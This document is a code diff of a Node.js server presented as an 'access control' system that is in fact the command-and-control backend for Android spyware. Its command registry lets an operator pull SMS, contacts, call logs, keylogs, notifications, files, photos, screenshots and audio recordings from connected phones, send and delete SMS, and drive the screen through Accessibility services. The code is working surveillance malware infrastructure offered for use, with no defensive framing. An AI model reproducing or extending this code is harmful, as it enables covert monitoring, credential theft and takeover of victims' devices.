@@ -1,367 +1,567 @@
-const express = require('express');
-const http = require('http');
-const net = require('net');
-const cors = require('cors');
-const path = require('path');
+// ============================================
+// ACCESS CONTROL SERVER
+// Unified TCP Protocol for Android + Dashboard
+// Protocol matches SocketManager.java exactly
+// Android: raw TCP (net.Socket)
+// Dashboard: WebSocket (TCP upgrade, same JSON protocol)
+// ============================================
+
+'use strict';
+
+const express  = require('express');
+const http     = require('http');
+const net      = require('net');
+const WebSocket = require('ws');
+const cors     = require('cors');
+const path     = require('path');
+const fs       = require('fs');
+const crypto   = require('crypto');
 const mongoose = require('mongoose');
-const socketIO = require('socket.io');
-const Redis = require('ioredis');
 require('dotenv').config();
 
-const app = express();
-const server = http.createServer(app);
-
-const io = socketIO(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
+// ============================================
+// CONFIG
+// ============================================
+const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
+const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
+const PING_INTERVAL  = 15000;   // ms – how often server pings clients
+const PONG_TIMEOUT   = 45000;   // ms – drop if no pong received
+const CMD_TIMEOUT_MS = 30000;   // ms – command timeout
 
 // ============================================
-// REDIS SETUP (Valkey)
+// COMMAND REGISTRY  (all cmds from SocketManager.java)
 // ============================================
-const redisClient = process.env.REDIS_URL 
-    ? new Redis(process.env.REDIS_URL)
-    : new Redis({
-        host: process.env.REDIS_HOST || 'localhost',
-        port: process.env.REDIS_PORT || 6379
-    });
+const COMMANDS = {
+    // General / Device
+    ping:                      { category: 'system',       label: 'Ping',                  icon: '📡' },
+    vibrate:                   { category: 'device',       label: 'Vibrate',               icon: '📳' },
+    play_sound:                { category: 'device',       label: 'Play Sound',            icon: '🔊' },
+    get_clipboard:             { category: 'data',         label: 'Get Clipboard',         icon: '📋' },
+    set_clipboard:             { category: 'data',         label: 'Set Clipboard',         icon: '📋' },
+    get_device_info:           { category: 'system',       label: 'Device Info',           icon: 'ℹ️'  },
+    get_location:              { category: 'location',     label: 'Get Location',          icon: '📍' },
+    get_installed_apps:        { category: 'data',         label: 'Installed Apps',        icon: '📦' },
+    get_battery_info:          { category: 'system',       label: 'Battery Info',          icon: '🔋' },
+    get_network_info:          { category: 'system',       label: 'Network Info',          icon: '🌐' },
+    get_wifi_networks:         { category: 'system',       label: 'WiFi Networks',         icon: '📶' },
+    get_system_info:           { category: 'system',       label: 'System Info',           icon: '💻' },
+    // SMS
+    get_all_sms:               { category: 'sms',          label: 'Get All SMS',           icon: '💬' },
+    get_sms_from_number:       { category: 'sms',          label: 'SMS From Number',       icon: '💬' },
+    send_sms:                  { category: 'sms',          label: 'Send SMS',              icon: '📤' },
+    delete_sms:                { category: 'sms',          label: 'Delete SMS',            icon: '🗑️' },
+    // Contacts
+    get_all_contacts:          { category: 'contacts',     label: 'Get Contacts',          icon: '👥' },
+    search_contacts:           { category: 'contacts',     label: 'Search Contacts',       icon: '🔍' },
+    // Calls
+    get_all_call_logs:         { category: 'calls',        label: 'All Call Logs',         icon: '📞' },
+    get_call_logs_by_type:     { category: 'calls',        label: 'Call Logs By Type',     icon: '📞' },
+    get_call_logs_from_number: { category: 'calls',        label: 'Calls From Number',     icon: '📞' },
+    get_call_statistics:       { category: 'calls',        label: 'Call Statistics',       icon: '📊' },
+    // Camera
+    get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
+    take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
+    // Screenshot
+    take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
+    // Files
+    list_files:                { category: 'files',        label: 'List Files',            icon: '📁' },
+    read_file:                 { category: 'files',        label: 'Read File',             icon: '📄' },
+    write_file:                { category: 'files',        label: 'Write File',            icon: '✏️'  },
+    delete_file:               { category: 'files',        label: 'Delete File',           icon: '🗑️' },
+    copy_file:                 { category: 'files',        label: 'Copy File',             icon: '📋' },
+    move_file:                 { category: 'files',        label: 'Move File',             icon: '📦' },
+    create_directory:          { category: 'files',        label: 'Create Directory',      icon: '📂' },
+    get_file_info:             { category: 'files',        label: 'File Info',             icon: '📄' },
+    search_files:              { category: 'files',        label: 'Search Files',          icon: '🔍' },
+    // Audio
+    start_recording:           { category: 'audio',        label: 'Start Recording',       icon: '🎤' },
+    stop_recording:            { category: 'audio',        label: 'Stop Recording',        icon: '⏹️' },
+    get_recording_status:      { category: 'audio',        label: 'Recording Status',      icon: '🎙️' },
+    get_audio:                 { category: 'audio',        label: 'Get Audio',             icon: '🎵' },
+    list_recordings:           { category: 'audio',        label: 'List Recordings',       icon: '🎵' },
+    delete_recording:          { category: 'audio',        label: 'Delete Recording',      icon: '🗑️' },
+    // Keylogs
+    get_keylogs:               { category: 'keylog',       label: 'Get Keylogs',           icon: '⌨️' },
+    clear_keylogs:             { category: 'keylog',       label: 'Clear Keylogs',         icon: '🧹' },
+    // Notifications
+    get_notifications:         { category: 'notifications',label: 'Get Notifications',     icon: '🔔' },
+    get_notifications_from_app:{ category: 'notifications',label: 'Notifs From App',       icon: '🔔' },
+    clear_notifications:       { category: 'notifications',label: 'Clear Notifications',   icon: '🧹' },
+    // Screen Control (Accessibility)
+    touch:                     { category: 'screen_ctrl',  label: 'Touch',                 icon: '👆' },
+    swipe:                     { category: 'screen_ctrl',  label: 'Swipe',                 icon: '👆' },
+    press_back:                { category: 'screen_ctrl',  label: 'Press Back',            icon: '◀️' },
+    press_home:                { category: 'screen_ctrl',  label: 'Press Home',            icon: '🏠' },
+    press_recents:             { category: 'screen_ctrl',  label: 'Press Recents',         icon: '⬜' },
+    open_notifications:        { category: 'screen_ctrl',  label: 'Open Notifications',    icon: '🔔' },
+    scroll_up:                 { category: 'screen_ctrl',  label: 'Scroll Up',             icon: '⬆️' },
+    scroll_down:               { category: 'screen_ctrl',  label: 'Scroll Down',           icon: '⬇️' },
+    // Screen Reader (Accessibility)
+    read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
+    find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
+    get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
+    get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
+    get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  }
+};
 
-redisClient.on('error', (err) => console.error('Redis error:', err.message));
-redisClient.on('connect', () => console.log('Redis connected'));
-
-const Device = require('./models/Device');
-const User = require('./models/User');
-const Command = require('./models/Command');
+// ============================================
+// MONGOOSE MODELS
+// ============================================
+const Device      = require('./models/Device');
+const User        = require('./models/User');
+const Command     = require('./models/Command');
 const ActivityLog = require('./models/ActivityLog');
 
-const authRoutes = require('./routes/auth');
+const authRoutes    = require('./routes/auth');
 const devicesRoutes = require('./routes/devices');
 
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, '../frontend')));
-
-app.use('/api/auth', authRoutes);
-app.use('/api/user', devicesRoutes);
-
-// Admin routes
-app.get('/api/admin/users', async (req, res) => {
-    try {
-        const users = await User.find({}, '-password').sort({ createdAt: -1 });
-        res.json({ success: true, users });
-    } catch (e) {
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-const connections = new Map();
-const commands = new Map();
-
-const PING_INTERVAL = 10000; // 10 seconds
-const PONG_TIMEOUT = 15000;  // 15 seconds - device considered offline if no pong received
-
-mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/remoteaccess', {
+mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/access-control', {
     serverSelectionTimeoutMS: 5000,
-    socketTimeoutMS: 45000,
-}).then(() => console.log('MongoDB connected')).catch(err => {
-    console.error('MongoDB connection failed:', err.message);
-    console.warn('Server will continue without MongoDB. Device data will not be persisted.');
-});
+    socketTimeoutMS: 45000
+}).then(() => log('DB', 'MongoDB connected'))
+  .catch(e => log('DB', 'MongoDB unavailable: ' + e.message, 'warn'));
 
-function broadcast(event, data) {
-    for (const conn of connections.values()) {
-        sendTo(conn, event, data);
-    }
+// ============================================
+// STATE
+// Separate maps for TCP (Android) vs WS (Dashboard)
+// ============================================
+/** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
+const tcpClients = new Map();          // connId → TCP socket
+/** @type {Map<string, WebSocket & {id:string, deviceId?:string, clientType:'dashboard', lastPong:number}>} */
+const wsClients  = new Map();          // clientId → WebSocket
+/** @type {Map<string, string>} */
+const deviceToTcp = new Map();         // deviceId → TCP connId
+/** @type {Map<string, {wsId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
+const pendingCmds = new Map();         // commandId → pending info
+
+// ============================================
+// LOGGING HELPERS
+// ============================================
+function log(tag, msg, level = 'info') {
+    const ts = new Date().toISOString().slice(11, 23);
+    const fn = level === 'warn' ? console.warn : level === 'error' ? console.error : console.log;
+    fn(`[${ts}][${tag}] ${msg}`);
 }
 
-function sendTo(conn, event, data) {
+// ============================================
+// PROTOCOL HELPERS
+// Both TCP and WS use the same JSON envelope:
+//   { "event": "...", "data": { ... } }
+// TCP: newline-terminated strings  (SocketManager.java style)
+// WS:  WebSocket text frames       (same JSON, no newline needed)
+// ============================================
+
+/** Send a protocol message to a TCP (Android) client */
+function tcpSend(conn, event, data) {
     if (conn && conn.writable) {
         conn.write(JSON.stringify({ event, data }) + '\n');
     }
 }
 
-async function handleTCPMessage(conn, message) {
-    try {
-        const msg = JSON.parse(message);
-        const { event, data } = msg;
-
-        switch (event) {
-            case 'device:register':
-                const deviceId = data.deviceId || conn.id;
-                let device = await Device.findOne({ deviceId });
-                if (!device) {
-                    device = new Device({
-                        deviceId,
-                        userIdString: data.userId || null,
-                        deviceName: data.deviceInfo?.name || deviceId,
-                        deviceInfo: data.deviceInfo || {},
-                        isOnline: true
-                    });
-                } else {
-                    device.isOnline = true;
-                    device.lastSeen = new Date();
-                    device.deviceInfo = { ...device.deviceInfo, ...data.deviceInfo };
-                }
-                await device.save();
-                conn.deviceId = deviceId;
-                conn.lastPong = Date.now();
-                console.log('Device registered:', deviceId);
-                broadcast('device:connected', device);
-                broadcast('device:list', await Device.find());
-                break;
-
-            case 'user:login':
-                const user = await User.findOne({ email: data.email });
-                if (user) {
-                    const sessionKey = Date.now().toString();
-                    broadcast('user:session', { sessionKey, userId: user._id, email: user.email });
-                }
-                const userDevices = await Device.find({ userId: data.userId });
-                sendTo(conn, 'device:list', userDevices);
-                break;
-
-            case 'command:response':
-                const { commandId, response, error } = data;
-                if (commands.has(commandId)) {
-                    const cmd = commands.get(commandId);
-                    cmd.status = error ? 'failed' : 'success';
-                    cmd.response = response;
-                    cmd.error = error;
-                    cmd.completedAt = new Date();
-                    await cmd.save();
-
-                    const device = await Device.findOne({ deviceId: cmd.deviceId });
-                    if (device) {
-                        const userDevices = await Device.find({ userId: device.userId });
-                        for (const d of userDevices) {
-                            const dConn = Array.from(connections.values()).find(c => c.deviceId === d.deviceId);
-                            if (dConn) sendTo(dConn, 'command:result', { commandId, command: cmd.command, response, error });
-                        }
-                    }
-                }
-                break;
-
-            case 'device:heartbeat':
-                await Device.findOneAndUpdate(
-                    { deviceId: data.deviceId },
-                    { lastSeen: new Date() },
-                    { new: true }
-                );
-                break;
-
-            case 'device:get_info':
-                const infoDevice = await Device.findOne({ deviceId: data.deviceId });
-                if (infoDevice) sendTo(conn, 'device:info', infoDevice.deviceInfo);
-                break;
-
-            case 'device:refresh':
-                const allDevices = await Device.find();
-                sendTo(conn, 'device:list', allDevices);
-                break;
-
-            case 'device:disconnect':
-                await Device.findOneAndUpdate(
-                    { deviceId: data.deviceId },
-                    { isOnline: false, lastSeen: new Date() }
-                );
-                broadcast('device:list', await Device.find());
-                break;
-
-            case 'device:pong':
-                if (conn.deviceId) {
-                    conn.lastPong = Date.now();
-                    const device = await Device.findOne({ deviceId: conn.deviceId });
-                    if (device) {
-                        device.lastSeen = new Date();
-                        device.isOnline = true;
-                        await device.save();
-                    }
-                }
-                break;
-        }
-    } catch (e) {
-        console.error('Failed to parse message:', e.message);
+/** Send a protocol message to a WebSocket (Dashboard) client */
+function wsSend(ws, event, data) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ event, data }));
     }
 }
 
-const tcpServer = net.createServer((conn) => {
-    conn.id = Date.now().toString();
-    connections.set(conn.id, conn);
-    console.log('New TCP connection:', conn.id);
+/** Broadcast an event to ALL connected dashboard WS clients */
+function broadcastDash(event, data) {
+    for (const ws of wsClients.values()) {
+        wsSend(ws, event, data);
+    }
+}
 
-    let buffer = '';
+// ============================================
+// SHARED MESSAGE PROCESSOR
+// Both TCP and WS messages go through here
+// ============================================
+async function processMessage(clientId, clientType, event, data) {
+    log(clientType === 'android' ? 'TCP' : 'WS',
+        `← [${clientId}] ${event}`);
 
-    conn.on('data', (data) => {
-        buffer += data.toString();
-        let newlineIndex;
-        while ((newlineIndex = buffer.indexOf('\n')) !== -1) {
-            const message = buffer.slice(0, newlineIndex);
-            buffer = buffer.slice(newlineIndex + 1);
-            if (message.trim()) {
-                handleTCPMessage(conn, message);
+    // ── Events expected from Android (TCP) ──────────────────────────
+    if (event === 'device:register') {
+        const { deviceId, deviceInfo } = data || {};
+        if (!deviceId) return;
+
+        // Link this TCP connection to the deviceId
+        const conn = tcpClients.get(clientId);
+        if (conn) {
+            conn.deviceId = deviceId;
+            conn.lastPong = Date.now();
+            deviceToTcp.set(deviceId, clientId);
+        }
+
+        // Persist / update
+        try {
+            let dev = await Device.findOne({ deviceId });
+            const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
+                           androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name };
+            if (!dev) {
+                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
+                                   deviceInfo: info, isOnline: true });
+            } else {
+                dev.isOnline  = true;
+                dev.lastSeen  = new Date();
+                dev.deviceInfo = { ...dev.deviceInfo, ...info };
             }
+            await dev.save();
+        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }
+
+        // Ack back to device
+        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId });
+
+        // Notify dashboards
+        broadcastDash('device:connected', { deviceId, deviceInfo, timestamp: new Date() });
+        broadcastDeviceList();
+        return;
+    }
+
+    if (event === 'device:heartbeat') {
+        const { deviceId } = data || {};
+        if (!deviceId) return;
+        const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now();
+        try { await Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }); } catch (e) {}
+        broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
+        return;
+    }
+
+    if (event === 'device:pong') {
+        const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now();
+        return;
+    }
+
+    // ── Command response from Android ───────────────────────────────
+    if (event === 'command:response') {
+        const { commandId, response, error } = data || {};
+        if (!commandId) return;
+
+        // Find which device this conn belongs to
+        const conn = tcpClients.get(clientId);
+        const deviceId = conn?.deviceId;
+
+        // Update DB
+        try {
+            await Command.findOneAndUpdate(
+                { id: commandId },
+                { status: error ? 'failed' : 'success', response, error, completedAt: new Date() }
+            );
+        } catch (e) {}
+
+        // Route result to the waiting dashboard socket
+        const pending = pendingCmds.get(commandId);
+        if (pending) {
+            clearTimeout(pending.timer);
+            pendingCmds.delete(commandId);
+
+            const ws = wsClients.get(pending.wsId);
+            const result = { commandId, command: pending.command, deviceId,
+                             response, error: error || null, success: !error,
+                             timestamp: new Date() };
+            if (ws) wsSend(ws, 'command:result', result);
+
+            // Also log to all dashboards
+            broadcastDash('activity:log', {
+                type: 'command_result', deviceId, command: pending.command,
+                commandId, success: !error, timestamp: new Date()
+            });
+        }
+        return;
+    }
+
+    // ── Events expected from Dashboard (WS) ─────────────────────────
+    if (event === 'dashboard:get_devices') {
+        const ws = wsClients.get(clientId);
+        if (ws) await sendDeviceListTo(ws);
+        return;
+    }
+
+    if (event === 'commands:get_registry') {
+        const ws = wsClients.get(clientId);
+        if (ws) wsSend(ws, 'commands:registry', COMMANDS);
+        return;
+    }
+
+    if (event === 'command:send') {
+        const { deviceId, command, params } = data || {};
+        const ws = wsClients.get(clientId);
+        if (!ws) return;
+
+        if (!deviceId || !command) {
+            wsSend(ws, 'command:error', { message: 'deviceId and command are required' });
+            return;
+        }
+        if (!COMMANDS[command]) {
+            wsSend(ws, 'command:error', { message: `Unknown command: ${command}` });
+            return;
+        }
+
+        // Find the TCP connection for this device
+        const tcpConnId = deviceToTcp.get(deviceId);
+        const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
+
+        if (!tcpConn || !tcpConn.writable) {
+            wsSend(ws, 'command:error', { commandId: null, message: 'Device is offline', deviceId, command });
+            return;
+        }
+
+        const commandId = crypto.randomBytes(12).toString('hex');
+
+        // Save to DB
+        try {
+            await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save();
+        } catch (e) {}
+
+        // Forward to Android device via TCP (matching SocketManager.java processMessage)
+        tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
+
+        // Track pending
+        const timer = setTimeout(() => {
+            if (pendingCmds.has(commandId)) {
+                pendingCmds.delete(commandId);
+                wsSend(ws, 'command:result', { commandId, command, deviceId,
+                    success: false, error: 'Command timed out', timestamp: new Date() });
+            }
+        }, CMD_TIMEOUT_MS);
+        pendingCmds.set(commandId, { wsId: clientId, command, deviceId, timer });
+
+        wsSend(ws, 'command:sent', { commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
+        log('CMD', `${command} → ${deviceId} [${commandId}]`);
+        return;
+    }
+
+    log('MSG', `Unhandled event: ${event}`, 'warn');
+}
+
+// ============================================
+// TCP SERVER — Android devices
+// ============================================
+const tcpServer = net.createServer((conn) => {
+    const id = crypto.randomBytes(8).toString('hex');
+    conn.id          = id;
+    conn.clientType  = 'android';
+    conn.lastPong    = Date.now();
+    conn.buf         = '';
+    tcpClients.set(id, conn);
+    log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);
+
+    conn.setEncoding('utf8');
+
+    conn.on('data', (chunk) => {
+        conn.buf += chunk;
+        let idx;
+        while ((idx = conn.buf.indexOf('\n')) !== -1) {
+            const line = conn.buf.slice(0, idx).trim();
+            conn.buf = conn.buf.slice(idx + 1);
+            if (!line) continue;
+            let msg;
+            try { msg = JSON.parse(line); } catch (e) { continue; }
+            processMessage(id, 'android', msg.event, msg.data);
         }
     });
 
     conn.on('close', async () => {
-        console.log('Connection closed:', conn.id);
-        connections.delete(conn.id);
-
+        log('TCP', `Disconnected ${id} (device: ${conn.deviceId || 'unregistered'})`);
+        tcpClients.delete(id);
         if (conn.deviceId) {
-            await Device.findOneAndUpdate(
-                { deviceId: conn.deviceId },
-                { isOnline: false, lastSeen: new Date() }
-            );
-            broadcast('device:disconnected', { deviceId: conn.deviceId });
-            broadcast('device:list', await Device.find());
+            deviceToTcp.delete(conn.deviceId);
+            try {
+                await Device.findOneAndUpdate({ deviceId: conn.deviceId },
+                    { isOnline: false, lastSeen: new Date() });
+            } catch (e) {}
+            broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
+            broadcastDeviceList();
         }
     });
 
-    conn.on('error', (err) => {
-        console.error('Connection error:', err.message);
+    conn.on('error', (e) => log('TCP', `Error on ${id}: ${e.message}`, 'error'));
+});
+
+tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
+    log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));
+
+// ============================================
+// HTTP + WEBSOCKET SERVER — Dashboard
+// ============================================
+const app    = express();
+const server = http.createServer(app);
+const wss    = new WebSocket.Server({ server, path: '/ws' });
+
+app.use(cors());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static(path.join(__dirname, '../frontend')));
+app.use('/api/auth', authRoutes);
+app.use('/api/user', devicesRoutes);
+
+wss.on('connection', async (ws, req) => {
+    const id = crypto.randomBytes(8).toString('hex');
+    ws.id         = id;
+    ws.clientType = 'dashboard';
+    ws.lastPong   = Date.now();
+    wsClients.set(id, ws);
+    log('WS', `Dashboard connected ${id} from ${req.socket.remoteAddress}`);
+
+    // Immediately send device list + command registry
+    await sendDeviceListTo(ws);
+    wsSend(ws, 'commands:registry', COMMANDS);
+
+    ws.on('message', (raw) => {
+        let msg;
+        try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
+        processMessage(id, 'dashboard', msg.event, msg.data);
     });
+
+    ws.on('pong', () => { ws.lastPong = Date.now(); });
+
+    ws.on('close', () => {
+        log('WS', `Dashboard disconnected ${id}`);
+        wsClients.delete(id);
+        // Clean up pending commands owned by this socket
+        for (const [cid, p] of pendingCmds) {
+            if (p.wsId === id) { clearTimeout(p.timer); pendingCmds.delete(cid); }
+        }
+    });
+
+    ws.on('error', (e) => log('WS', `Error on ${id}: ${e.message}`, 'error'));
 });
 
-tcpServer.listen(9000, '0.0.0.0', () => {
-    console.log('TCP server listening on 0.0.0.0:9000');
-});
-
+// ============================================
+// REST ENDPOINTS
+// ============================================
 app.get('/api/devices', async (req, res) => {
     try {
-        const devices = await Device.find();
-        res.json(devices);
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
+        const devices = await Device.find().sort({ lastSeen: -1 });
+        res.json({ success: true, devices });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
 app.get('/api/devices/:deviceId', async (req, res) => {
     try {
         const device = await Device.findOne({ deviceId: req.params.deviceId });
-        if (device) res.json(device);
-        else res.status(404).json({ error: 'Device not found' });
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
+        if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
+        res.json({ success: true, device });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
 app.post('/api/commands', async (req, res) => {
+    const { deviceId, command, params } = req.body;
+    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
+    if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });
+
+    const tcpConnId = deviceToTcp.get(deviceId);
+    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
+    if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });
+
+    const commandId = crypto.randomBytes(12).toString('hex');
+    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
+
+    try { await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save(); } catch (e) {}
+    res.json({ success: true, commandId, status: 'executing' });
+});
+
+app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));
+
+app.get('/api/health', (req, res) => res.json({
+    status: 'ok',
+    mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
+    tcpClients: tcpClients.size,
+    wsClients: wsClients.size,
+    connectedDevices: deviceToTcp.size,
+    pendingCommands: pendingCmds.size,
+    tcpPort: TCP_PORT,
+    httpPort: HTTP_PORT,
+    uptime: process.uptime()
+}));
+
+app.get('/api/admin/users', async (req, res) => {
     try {
-        const { deviceId, command, data } = req.body;
-        const device = await Device.findOne({ deviceId });
-
-        if (device && device.isOnline) {
-            const commandId = Date.now().toString();
-            const cmd = new Command({
-                id: commandId,
-                deviceId,
-                command,
-                data,
-                status: 'pending'
-            });
-            await cmd.save();
-
-            const conn = Array.from(connections.values()).find(c => c.deviceId === deviceId);
-            if (conn) sendTo(conn, 'command:execute', cmd);
-
-            res.json({ success: true, commandId });
-        } else {
-            res.status(404).json({ error: 'Device offline or not found' });
-        }
-    } catch (e) {
-        res.status(500).json({ error: e.message });
-    }
+        const users = await User.find({}, '-password').sort({ createdAt: -1 });
+        res.json({ success: true, users });
+    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
-
-app.get('/api/commands/:commandId', (req, res) => {
-    const cmd = commands.get(req.params.commandId);
-    if (cmd) res.json(cmd);
-    else res.status(404).json({ error: 'Command not found' });
-});
-
-app.get('/api/health', async (req, res) => {
-    let mongoStatus = 'disconnected';
-    try {
-        if (mongoose.connection.readyState === 1) mongoStatus = 'connected';
-    } catch (e) {
-        mongoStatus = 'error';
-    }
-    res.json({
-        status: 'ok',
-        mongodb: mongoStatus,
-        tcpConnections: connections.size,
-        commands: commands.size,
-        uptime: process.uptime()
-    });
-});
-
-const fs = require('fs');
 
 app.get('*', (req, res) => {
-    const filePath = path.join(__dirname, '../frontend', req.path);
-    if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
-        res.sendFile(filePath);
-    } else {
-        res.sendFile(path.join(__dirname, '../frontend/index.html'));
-    }
+    const fp = path.join(__dirname, '../frontend', req.path);
+    if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
+    else res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
 
-const HTTP_PORT = process.env.PORT || 5000;
-server.listen(HTTP_PORT, () => {
-    console.log(`HTTP Server running on port ${HTTP_PORT}`);
-    console.log(`TCP device server: 127.0.0.1:9000`);
-    console.log(`Admin panel: http://localhost:${HTTP_PORT}/admin-login.html`);
-});
+// ============================================
+// DB HELPERS
+// ============================================
+async function broadcastDeviceList() {
+    try {
+        const devices = await Device.find().sort({ lastSeen: -1 });
+        broadcastDash('device:list', devices);
+    } catch (e) {}
+}
 
-setInterval(async () => {
-    const thirtySecondsAgo = new Date(Date.now() - 30 * 1000);
-    await Device.updateMany(
-        { lastSeen: { $lt: thirtySecondsAgo }, isOnline: true },
-        { isOnline: false }
-    );
-}, 30 * 1000);
+async function sendDeviceListTo(ws) {
+    try {
+        const devices = await Device.find().sort({ lastSeen: -1 });
+        wsSend(ws, 'device:list', devices);
+    } catch (e) { wsSend(ws, 'device:list', []); }
+}
 
+// ============================================
+// PERIODIC TASKS
+// ============================================
+
+// Ping TCP clients (Android devices)
 setInterval(() => {
-    const now = Date.now();
-    for (const [id, conn] of connections) {
-        if (conn.writable) {
-            sendTo(conn, 'device:ping', { timestamp: now });
-        }
+    for (const conn of tcpClients.values()) {
+        if (conn.writable) tcpSend(conn, 'device:ping', { timestamp: Date.now() });
     }
 }, PING_INTERVAL);
 
+// Ping WS clients (dashboards)
 setInterval(() => {
+    for (const ws of wsClients.values()) {
+        if (ws.readyState === WebSocket.OPEN) ws.ping();
+    }
+}, PING_INTERVAL);
+
+// Drop stale TCP connections
+setInterval(async () => {
     const now = Date.now();
-    const staleConnections = [];
-    
-    for (const [id, conn] of connections) {
-        const timeSinceLastPong = now - (conn.lastPong || 0);
-        
-        if (conn.deviceId && timeSinceLastPong > PONG_TIMEOUT) {
-            staleConnections.push({ conn, id, timeSinceLastPong });
+    for (const [id, conn] of tcpClients) {
+        if (!conn.deviceId) continue;
+        if (now - conn.lastPong > PONG_TIMEOUT) {
+            log('TCP', `Device ${conn.deviceId} timed out, dropping`);
+            tcpClients.delete(id);
+            deviceToTcp.delete(conn.deviceId);
+            conn.destroy();
+            try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
+            broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
+            broadcastDeviceList();
         }
     }
-    
-    for (const { conn, id, timeSinceLastPong } of staleConnections) {
-        console.log(`Device ${conn.deviceId} timed out (${Math.round(timeSinceLastPong/1000)}s since last pong)`);
-        connections.delete(id);
-        conn.destroy();
-        
-        if (conn.deviceId) {
-            Device.findOneAndUpdate(
-                { deviceId: conn.deviceId },
-                { isOnline: false, lastSeen: new Date() }
-            ).then(() => {
-                broadcast('device:disconnected', { deviceId: conn.deviceId });
-                Device.find().then(devices => broadcast('device:list', devices));
-            });
-        }
-    }
-}, 5000);
+}, 10000);
+
+// Mark DB devices offline if not seen in 60s
+setInterval(async () => {
+    try {
+        const cutoff = new Date(Date.now() - 60000);
+        await Device.updateMany({ lastSeen: { $lt: cutoff }, isOnline: true }, { isOnline: false });
+    } catch (e) {}
+}, 30000);
+
+// ============================================
+// START
+// ============================================
+server.listen(HTTP_PORT, () => {
+    log('HTTP', `Server running on port ${HTTP_PORT}`);
+    log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
+    log('TCP',  `Android devices → localhost:${TCP_PORT}`);
+});
 
 process.on('SIGINT', async () => {
+    log('SHUTDOWN', 'Closing...');
     await mongoose.connection.close();
     process.exit(0);
 });
+
+module.exports = { app, server, wss };
